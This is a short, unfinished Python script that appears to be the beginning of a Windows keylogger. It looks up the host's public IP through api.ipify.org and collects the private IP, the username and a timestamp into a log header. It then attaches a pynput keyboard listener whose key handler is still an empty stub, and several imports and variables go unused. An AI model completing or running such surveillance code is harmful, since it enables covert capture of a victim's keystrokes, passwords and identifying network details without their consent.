import pynput 
import os
import random
import requests
import time
import socket
import win32gui
from pynput.keyboard import Key,Listener


publicip = requests.get('https://api.ipify.org').text
privateip = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())

msg = f"[Start Of Logs] date/Time: {datetime} UserProfile Publicip: {publicip} - Privateip: {privateip}"
logged_date = []
logged_date.append(msg)

old_app = ''
delete_file = []

def on_press(key):
    global old_app
with Listener(on_press=on_press) as listener:
   listener.join()

print(msg)